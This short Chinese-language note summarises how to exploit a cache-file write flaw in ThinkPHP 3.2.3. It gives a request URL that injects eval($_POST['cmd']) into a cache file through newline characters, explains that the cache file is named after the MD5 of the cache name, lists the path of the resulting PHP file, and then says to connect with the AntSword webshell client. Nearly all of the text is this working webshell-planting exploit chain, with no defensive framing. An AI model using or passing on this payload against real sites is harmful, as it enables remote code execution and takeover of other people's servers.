总结¶

Thinkphp3.2.3¶

  1. 漏洞文件位置(一般审计得出)

  2. http://www.0-sec.org/index.php/Home/Index/get?id=%0d%0aeval($_POST['cmd']);%0d%0a//

  3. 缓存文件为缓存名的md5值，这里采用md5（name）=b068931cc450442b63f5b3d276ea4297

  4. http://www.0-sec.org/Application/Runtime/Temp/b068931cc450442b63f5b3d276ea4297.php

  5. 之后蚁剑连接。
